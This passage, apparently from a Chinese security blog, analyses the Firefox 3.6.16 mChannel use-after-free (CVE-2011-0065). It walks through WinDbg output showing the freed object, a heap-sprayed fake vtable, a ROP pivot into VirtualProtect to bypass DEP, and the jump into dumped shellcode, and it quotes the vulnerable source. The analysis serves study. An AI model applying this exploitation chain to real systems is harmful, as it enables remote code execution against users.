+0x01e mBroken          : 0y0</span><br><span class="line">   +0x01e mUserDisabled    : 0y0</span><br><span class="line">   +0x01e mSuppressed      : 0y0</span><br><span class="line">   +0x020 __VFN_table : (null) </span><br><span class="line">   +0x024 __VFN_table : (null) </span><br><span class="line">   +0x028 __VFN_table : 0x02d00000 </span><br><span class="line">   +0x02c __VFN_table : 0x00000004 </span><br><span class="line">   +0x030 __VFN_table : 0x109e11e0 </span><br><span class="line">   +0x034 __VFN_table : 0x109e1348 </span><br><span class="line">   +0x038 mFinalListener   : nsCOMPtr&lt;nsIStreamListener&gt;</span><br><span class="line">   +0x03c mFrameLoader     : nsRefPtr&lt;nsFrameLoader&gt;</span><br><span class="line">   +0x040 mPendingInstantiateEvent : (null) </span><br><span class="line">   +0x044 mContentType     : nsCString</span><br><span class="line">   +0x050 mChannel         : 0x033b1130 nsIChannel</span><br><span class="line">   +0x054 mURI             : nsCOMPtr&lt;nsIURI&gt;</span><br><span class="line">   +0x058 mClassifier      : nsCOMPtr&lt;nsIChannelClassifier&gt;</span><br><span class="line">   +0x05c mType            : 0y00000000000001015 (No matching name)</span><br><span class="line"></span><br><span class="line">   +0x05c mInstantiating   : 0y0</span><br><span class="line">   +0x05c mUserDisabled    : 0y0</span><br><span class="line">   +0x05c mSuppressed      : 0y0</span><br><span class="line">   +0x060 mFallbackReason  : 0x386e220 (No matching name)</span><br><span class="line">//这里已经+0x01c mImageBlockingStatus : 0n-32704 已经变成aNewChannel</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 4 hit</span><br><span class="line">eax=03878040 ebx=0082416c ecx=03877be0 edx=006d0040 esi=0012ec24 edi=02e1da00</span><br><span class="line">eip=101389fa esp=0012ec08 ebp=00890260 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">xul!nsXPCWrappedJS::Release+0x18a:</span><br><span class="line">101389fa e897761b00      call    xul!operator delete (102f0096)</span><br><span class="line">//这里在回收mChannel的对象，然后mChannel就称为了悬挂指针</span><br><span class="line">0:000&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0012ec1c 1010fd7b 008b3cd0 00000000 02e1b7e0 xul!nsXPCWrappedJS::Release+0x18a (FPO: [Uses EBP] [1,1,0]) (CONV: stdcall) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappedjs.cpp @ 240]</span><br><span class="line">0012eea8 10118bf3 0012eed8 00000000 00000000 xul!XPCWrappedNative::CallMethod+0xecb (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappednative.cpp @ 2895]</span><br><span class="line">0012ef74 00516add 02fb3c00 02e1b700 00000003 xul!XPC_WN_CallMethod+0x173 (FPO: [Uses EBP] [5,44,4]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappednativejsops.cpp @ 1740]</span><br><span class="line">0012f028 0051b800 02fb3c00 00000003 0381206c js3250!js_Invoke+0x42d (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1360]</span><br><span class="line">0012f254 004f7195 02fb3c00 0012f304 033f8800 js3250!js_Interpret+0x29a0 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsops.cpp @ 2241]</span><br><span class="line">0012f2d8 004e41d1 015f1a40 033f8800 00000000 js3250!js_Execute+0x1a5 (FPO: [Uses EBP] [4,29,2]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1601]</span><br><span class="line">0012f304 1007f780 02fb3c00 015f1a40 033f0334 js3250!JS_EvaluateUCScriptForPrincipals+0x61 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsapi.cpp @ 5058]</span><br><span class="line">0012f378 1007f57a 0012f44c 015f1a40 033f0330 xul!nsJSContext::EvaluateString+0x158 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\dom\base\nsjsenvironment.cpp @ 1764]</span><br><span class="line">0012f430 10015587 038778b0 0012f44c 015f0fd0 xul!nsScriptLoader::EvaluateScript+0x18f (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptloader.cpp @ 711]</span><br><span class="line">0012f4e4 10072b18 015f0fd0 015f0fd0 02e1d5a4 xul!nsScriptLoader::ProcessRequest+0x6f (FPO: [1,38,0]) (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptloader.cpp @ 625]</span><br><span class="line">0012f880 101a7d9f 02e1d5a4 02e1d5a4 033f4000 xul!nsScriptLoader::ProcessScriptElement+0x2e8 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptloader.cpp @ 577]</span><br><span class="line">0012f89c 10015432 033f40bc 033f4000 02e1d580 xul!nsScriptElement::MaybeProcessScript+0x88 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptelement.cpp @ 193]</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 4 hit</span><br><span class="line">eax=03878040 ebx=00000001 ecx=00000000 edx=00000290 esi=00000000 edi=0381ef60</span><br><span class="line">eip=005becee esp=0012eff8 ebp=0012f02c iopl=0         nv up ei ng nz ac pe cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297</span><br><span class="line">js3250!str_unescape+0x2f8:</span><br><span class="line">005becee 0f82dffdffff    jb      js3250!str_unescape+0xdd (005bead3)     [br=1]</span><br><span class="line">//重新申请刚释放的位置内存，并写入地址shellcode</span><br><span class="line">0:000&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0012f02c 00519f08 02fb3c00 00000001 03812070 js3250!str_unescape+0x330 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsstr.cpp @ 507]</span><br><span class="line">0012f254 004f7195 02fb3c00 0012f304 033f8800 js3250!js_Interpret+0x10a8 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsops.cpp @ 2208]</span><br><span class="line">0012f2d8 004e41d1 015f1a40 033f8800 00000000 js3250!js_Execute+0x1a5 (FPO: [Uses EBP] [4,29,2]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1601]</span><br><span class="line">0012f304 1007f780 02fb3c00 015f1a40 033f0334 js3250!JS_EvaluateUCScriptForPrincipals+0x61 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsapi.cpp @ 5058]</span><br><span class="line">0012f378 1007f57a 0012f44c 015f1a40 033f0330 xul!nsJSContext::EvaluateString+0x158 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\dom\base\nsjsenvironment.cpp @ 1764]</span><br><span class="line">0012f430 10015587 038778b0 0012f44c 015f0fd0 xul!nsScriptLoader::EvaluateScript+0x18f (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptloader.cpp @ 711]</span><br><span class="line">//这里mChannel指向的虚函数表地址已经被改变。变成了0x0c000000一个堆地址</span><br><span class="line">0:000&gt; dd 03878040</span><br><span class="line">03878040  0c000000 02e10000 03879d20 03879e70</span><br><span class="line">03878050  10a676bc 033f00b0 00814330 00000002</span><br><span class="line">03878060  10a67278 0386ee00 008b9db8 ecb2ddc2</span><br><span class="line">0:000&gt; !address 0c000000                                     </span><br><span class="line">Failed to map Heaps (error 80004005)</span><br><span class="line">Usage:                  Free</span><br><span class="line">Base Address:           03900000</span><br><span class="line">End Address:            10000000</span><br><span class="line">Region Size:            0c700000</span><br><span class="line">Type:                   00000000	</span><br><span class="line">State:                  00010000	MEM_FREE</span><br><span class="line">Protect:                00000001	PAGE_NOACCESS</span><br><span class="line">//这里ecx为虚函数表地址，ecx+18h为虚函数地址指针，[ecx+18h]为虚函数地址</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=03878040 ebx=032873a4 ecx=0c000000 edx=015f0f40 esi=804b0002 edi=80000000</span><br><span class="line">eip=107f4e72 esp=0012f638 ebp=0012f844 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">xul!nsObjectLoadingContent::LoadObject+0x105:</span><br><span class="line">107f4e72 ff5118          call    dword ptr [ecx+18h]  ds:0023:0c000018=1052c871</span><br><span class="line">107f4e70 56              push    esi</span><br><span class="line">107f4e71 50              push    eax</span><br><span class="line">107f4e72 ff5118          call    dword ptr [ecx+18h]  ds:0023:0c000018=1052c871     //这里跳转到shellcode处</span><br><span class="line">107f4e75 8d4b38          lea     ecx,[ebx+38h]</span><br><span class="line">107f4e78 e8e4d3afff      call    xul!nsCOMPtr&lt;nsIStreamListener&gt;::operator nsIStreamListener * (102f2261)</span><br><span class="line">107f4e7d 85c0            test    eax,eax</span><br><span class="line">0:000&gt; ? ecx+18h</span><br><span class="line">Evaluate expression: 201326616 = 0c000018</span><br><span class="line">0:000&gt; dd 0c000018</span><br><span class="line">0c000018  1052c871 73644969 7c801ad4 735a4f5a</span><br><span class="line">0c000028  69646658 1003876b 0c000040 00000400</span><br><span class="line">0c000038  00000040 0c0c0c00 93d6f997 42904f97</span><br><span class="line">0c000048  274f4341 46fc9f2f 99903f98 9f969842</span><br><span class="line">0c000058  37d6f541 9746434a 98f54b48 f84bf598</span><br><span class="line">0c000068  964a4a99 49489698 d6489341 4b4ffc9f</span><br><span class="line">0c000078  9b3797f8 d6fcd637 90484799 4e4af99f</span><br><span class="line">0c000088  904327fd 402f2f98 979b4141 91499847</span><br><span class="line">//这里应该是传说中的ROP链</span><br><span class="line">0:000&gt; u 1052c871 </span><br><span class="line">xul!nsHttpHandler::SetVendorComment+0x10 [e:\builds\moz2_slave\rel-192-w32-bld\build\netwerk\protocol\http\src\nshttphandler.cpp @ 1612]:</span><br><span class="line">1052c871 8b21            mov     esp,dword ptr [ecx]       //[ecx=0c000000]=0c00001c,修改堆栈指针esp为0c00001c</span><br><span class="line">1052c873 baffc6865c      mov     edx,5C86C6FFh</span><br><span class="line">1052c878 0100            add     dword ptr [eax],eax</span><br><span class="line">1052c87a 0001            add     byte ptr [ecx],al</span><br><span class="line">1052c87c 33c0            xor     eax,eax</span><br><span class="line">1052c87e 5e              pop     esi</span><br><span class="line">1052c87f c20800          ret     8</span><br><span class="line">0:000&gt; dd esp                                       </span><br><span class="line">0c00001c  73644969 7c801ad4 735a4f5a 69646658</span><br><span class="line">0c00002c  1003876b 0c000040 00000400 00000040</span><br><span class="line">0c00003c  0c0c0c00 93d6f997 42904f97 274f4341</span><br><span class="line">0c00004c  46fc9f2f 99903f98 9f969842 37d6f541</span><br><span class="line">0c00005c  9746434a 98f54b48 f84bf598 964a4a99</span><br><span class="line">0c00006c  49489698 d6489341 4b4ffc9f 9b3797f8</span><br><span class="line">0c00007c  d6fcd637 90484799 4e4af99f 904327fd</span><br><span class="line">0c00008c  402f2f98 979b4141 91499847 92fd914f</span><br><span class="line">//7c801ad4是xul!nsHttpHandler::SetVendorComment+0x10函数的返回地址，当ret 8后直接进入函数VirtualProtect</span><br><span class="line">0:000&gt; u 7c801ad4</span><br><span class="line">kernel32!VirtualProtect:</span><br><span class="line">7c801ad4 8bff            mov     edi,edi</span><br><span class="line">7c801ad6 55              push    ebp</span><br><span class="line">7c801ad7 8bec            mov     ebp,esp</span><br><span class="line">7c801ad9 ff7514          push    dword ptr [ebp+14h]</span><br><span class="line">7c801adc ff7510          push    dword ptr [ebp+10h]</span><br><span class="line">7c801adf ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">7c801ae2 ff7508          push    dword ptr [ebp+8]</span><br><span class="line">7c801ae5 6aff            push    0FFFFFFFFh</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000000 ebx=0338a764 ecx=0c000000 edx=5c86c6ff esi=73644969 edi=80000000</span><br><span class="line">eip=1052c87f esp=0c000020 ebp=0012eaa4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">xul!nsHttpHandler::SetVendorComment+0x1e:</span><br><span class="line">1052c87f c20800          ret     8</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000000 ebx=0338a764 ecx=0c000000 edx=5c86c6ff esi=73644969 edi=80000000</span><br><span class="line">eip=7c801ad4 esp=0c00002c ebp=0012eaa4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">kernel32!VirtualProtect:</span><br><span class="line">7c801ad4 8bff            mov     edi,edi</span><br><span class="line">//1003876b是VirtualProtect的返回地址，后面是VirtualProtect的参数</span><br><span class="line">0:000&gt; dd esp</span><br><span class="line">0c00002c  1003876b 0c000040 00000400 00000040</span><br><span class="line">0c00003c  0c0c0c00 93d6f997 42904f97 274f4341</span><br><span class="line">0c00004c  46fc9f2f 99903f98 9f969842 37d6f541</span><br><span class="line">0c00005c  9746434a 98f54b48 f84bf598 964a4a99</span><br><span class="line">0c00006c  49489698 d6489341 4b4ffc9f 9b3797f8</span><br><span class="line">0c00007c  d6fcd637 90484799 4e4af99f 904327fd</span><br><span class="line">0c00008c  402f2f98 979b4141 91499847 92fd914f</span><br><span class="line">0c00009c  913f9846 984746f8 41404bfc f541f596</span><br><span class="line">/*</span><br><span class="line">BOOL VirtualProtect(  </span><br><span class="line">  LPVOID lpAddress,       // region of committed pages     0c000040</span><br><span class="line">  SIZE_T dwSize,          // size of the region            00000400  </span><br><span class="line">  DWORD flNewProtect,     // desired access protection     00000040 </span><br><span class="line">  PDWORD lpflOldProtect   // old protection);              0c0c0c00            </span><br><span class="line"> */</span><br><span class="line">kernel32!VirtualProtect:</span><br><span class="line">7c801ad4 8bff            mov     edi,edi</span><br><span class="line">7c801ad6 55              push    ebp</span><br><span class="line">7c801ad7 8bec            mov     ebp,esp</span><br><span class="line">7c801ad9 ff7514          push    dword ptr [ebp+14h]  ss:0023:0c00003c=0c0c0c00</span><br><span class="line">7c801adc ff7510          push    dword ptr [ebp+10h]</span><br><span class="line">7c801adf ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">7c801ae2 ff7508          push    dword ptr [ebp+8]</span><br><span class="line">7c801ae5 6aff            push    0FFFFFFFFh</span><br><span class="line">7c801ae7 e875ffffff      call    kernel32!VirtualProtectEx (7c801a61)</span><br><span class="line">7c801aec 5d              pop     ebp</span><br><span class="line">7c801aed c21000          ret     10h</span><br><span class="line">0:000&gt; dd esp+8</span><br><span class="line">0c000030  0c000040 00000400 00000040 0c0c0c00</span><br><span class="line">0c000040  93d6f997 42904f97 274f4341 46fc9f2f</span><br><span class="line">0c000050  99903f98 9f969842 37d6f541 9746434a</span><br><span class="line">0c000060  98f54b48 f84bf598 964a4a99 49489698</span><br><span class="line">0c000070  d6489341 4b4ffc9f 9b3797f8 d6fcd637</span><br><span class="line">0c000080  90484799 4e4af99f 904327fd 402f2f98</span><br><span class="line">0c000090  979b4141 91499847 92fd914f 913f9846</span><br><span class="line">0c0000a0  984746f8 41404bfc f541f596 903f4292</span><br><span class="line">//设置堆属性,过dep</span><br><span class="line">0:000&gt; !address 0c000000                                    </span><br><span class="line">Failed to map Heaps (error 80004005)</span><br><span class="line">Usage:                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        0c000000</span><br><span class="line">Base Address:           0c000000</span><br><span class="line">End Address:            0c001000</span><br><span class="line">Region Size:            00001000</span><br><span class="line">Type:                   00020000	MEM_PRIVATE</span><br><span class="line">State:                  00001000	MEM_COMMIT</span><br><span class="line">Protect:                00000040	PAGE_EXECUTE_READWRITE</span><br><span class="line">kernel32!VirtualProtect+0x18:</span><br><span class="line">7c801aec 5d              pop     ebp</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000001 ebx=0338a764 ecx=0bffffe8 edx=7c92e4f4 esi=73644969 edi=80000000</span><br><span class="line">eip=7c801aed esp=0c00002c ebp=0012eaa4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">kernel32!VirtualProtect+0x19:</span><br><span class="line">7c801aed c21000          ret     10h</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000001 ebx=0338a764 ecx=0bffffe8 edx=7c92e4f4 esi=73644969 edi=80000000</span><br><span class="line">eip=1003876b esp=0c000040 ebp=0012eaa4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">xul!DetermineParseMode+0x22:</span><br><span class="line">1003876b ffe4            jmp     esp &#123;0c000040&#125;</span><br><span class="line">//跳板指令1003876b，跳入shellcode中执行，开始是一段滑板指令</span><br><span class="line">0:000&gt; !address 0c000000                           </span><br><span class="line">Failed to map Heaps (error 80004005)</span><br><span class="line">Usage:                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        0c000000</span><br><span class="line">Base Address:           0c000000</span><br><span class="line">End Address:            0c001000</span><br><span class="line">Region Size:            00001000</span><br><span class="line">Type:                   00020000	MEM_PRIVATE</span><br><span class="line">State:                  00001000	MEM_COMMIT</span><br><span class="line">Protect:                00000040	PAGE_EXECUTE_READWRITE</span><br><span class="line">0:000&gt; u 0c000040</span><br><span class="line">0c000040 97              xchg    eax,edi</span><br><span class="line">0c000041 f9              stc</span><br><span class="line">0c000042 d6              ???</span><br><span class="line">0c000043 93              xchg    eax,ebx</span><br><span class="line">0c000044 97              xchg    eax,edi</span><br><span class="line">0c000045 4f              dec     edi</span><br><span class="line">0c000046 90              nop</span><br><span class="line">0c000047 42              inc     edx</span><br></pre></td></tr></table></figure>
<h3 id="漏洞函数">漏洞函数</h3><ul>
<li>存在问题的函数<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nsIChannelEventSink</span></span><br><span class="line">NS_IMETHODIMP</span><br><span class="line">nsObjectLoadingContent::OnChannelRedirect(nsIChannel *aOldChannel,</span><br><span class="line">                                          nsIChannel *aNewChannel,</span><br><span class="line">                                          PRUint32    aFlags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// If we're already busy with a new load, cancel the redirect</span></span><br><span class="line">  <span class="keyword">if</span> (aOldChannel != mChannel) &#123;<span class="comment">//打补丁后，这里变成了if (!mChannel||aOldChannel != mChannel)</span></span><br><span class="line">      <span class="keyword">return</span> NS_BINDING_ABORTED;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mClassifier) &#123;</span><br><span class="line">    mClassifier-&gt;OnRedirect(aOldChannel, aNewChannel);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mChannel = aNewChannel;</span><br><span class="line">  <span class="keyword">return</span> NS_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- 触发漏洞的函数</span><br><span class="line">```c</span><br><span class="line">nsresult</span><br><span class="line">nsObjectLoadingContent::LoadObject(nsIURI* aURI,</span><br><span class="line">                                   PRBool aNotify,</span><br><span class="line">                                   <span class="keyword">const</span> nsCString&amp; aTypeHint,</span><br><span class="line">                                   PRBool aForceLoad)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line"><span class="comment">// From here on, we will always change the content. This means that a</span></span><br><span class="line">  <span class="comment">// possibly-loading channel should be aborted.</span></span><br><span class="line">  <span class="keyword">if</span> (mChannel) &#123;</span><br><span class="line">    LOG((<span class="string">"OBJLC [%p]: Cancelling existing load\n"</span>, <span class="keyword">this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mClassifier) &#123;</span><br><span class="line">      mClassifier-&gt;Cancel();</span><br><span class="line">      mClassifier = nsnull;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// These three statements are carefully ordered:</span></span><br><span class="line">    <span class="comment">// - onStopRequest should get a channel whose status is the same as the</span></span><br><span class="line">    <span class="comment">//   status argument</span></span><br><span class="line">    <span class="comment">// - onStopRequest must get a non-null channel</span></span><br><span class="line">    mChannel-&gt;Cancel(NS_BINDING_ABORTED);</span><br><span class="line">    <span class="keyword">if</span> (mFinalListener) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">NOTE:</span> Since mFinalListener is only set in onStartRequest, which takes</span></span><br><span class="line">      <span class="comment">// care of calling mFinalListener-&gt;OnStartRequest, mFinalListener is only</span></span><br><span class="line">      <span class="comment">// non-null here if onStartRequest was already called.</span></span><br><span class="line">      mFinalListener-&gt;OnStopRequest(mChannel, nsnull, NS_BINDING_ABORTED);</span><br><span class="line">      mFinalListener = nsnull;</span><br><span class="line">    &#125;</span><br><span class="line">    mChannel = nsnull;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>简单分析就是这样了，感觉分析的时候有很多坑（虽然这个漏洞有符号文件及源码），一定要坚持下来。总体就是mChannel对象被释放后变成悬挂指针然后马上重新申请这块内存写入构造的shellcode（主要就是修改对象的虚函数表指针地址），在mChannel对象的函数mChannel-&gt;Cancel被使用时获得执行机会。对于漏洞利用还有很多需要细致的学习，通过布局内存利用漏洞。<br>主要知识点包括：虚函数、堆喷射Heap Spray、ROP</p>
<p>##参考<br><a href="https://book.douban.com/subject/26830238/" target="_blank" rel="external">漏洞战争-软件漏洞分析摘要</a><br><a href="http://blog.csdn.net/magictong/article/details/7391397" target="_blank" rel="external">Heap Spray原理浅析</a><br><a href="http://bbs.pediy.com/showthread.php?p=992676" target="_blank" rel="external">Analysis CVE2011-0065-Firefox 3.6.16 mChannel use after free vulnerability</a></p>
<h2 id="更新附录">更新附录</h2><p>shellcode分析可以和msf漏洞生成脚本一起看，一下就豁然开朗了<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span 